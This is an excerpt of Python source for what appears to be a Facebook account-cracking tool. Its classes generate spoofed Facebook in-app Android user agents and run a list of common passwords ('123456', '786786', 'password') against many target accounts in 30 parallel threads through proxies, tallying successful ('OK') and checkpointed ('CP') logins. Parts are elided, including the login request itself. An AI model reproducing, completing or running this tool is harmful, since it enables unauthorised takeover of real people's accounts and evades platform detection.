...
class UserAgentGenerator:
    def __init__(self):
        self.models = ['SM-S928B', 'Pixel 9 Pro', 'SM-G998B', 'V2303', 'RMX3840', 'TECNO-LH7n']

    def generate_user_agent(self):
        android_version = random.choice(['13', '14', '15', '16'])
        device = random.choice(self.models)
        fb_version = random.choice(['542.0.0.37.140', '533.0.0.49.79', '425.1.0.28.120'])
        chrome_version = f"{random.randint(130, 145)}.0.{random.randint(5000, 7000)}.{random.randint(10, 190)}"
        return f"Mozilla/5.0 (Linux; Android {android_version}; {device} Build/{''.join(random.choices(ascii_letters+digits, k=6))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};]"
...
class BGRICracker:
    ...
    def execute_breach(self, prefix):
        ...
        passlist = ['123456', '12345678', '123456789', '786786', '112233', 'password']
        with tred(max_workers=30) as executor:
            clear()
            print(f"  {self.color.W}➤ Targets: {self.color.G}{len(targets)} | Proxies: {len(self.proxies)}")
            linex()
    ...
    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.G}[Dani] {self.loop}|OK:{len(self.oks)}|CP:{len(self.cps)} {self.color.W}')
        sys.stdout.flush()
    ...
    def display_results(self):
        ...
        input(f"  {self.color.C}Press ENTER to continue")
        self.old_menu()
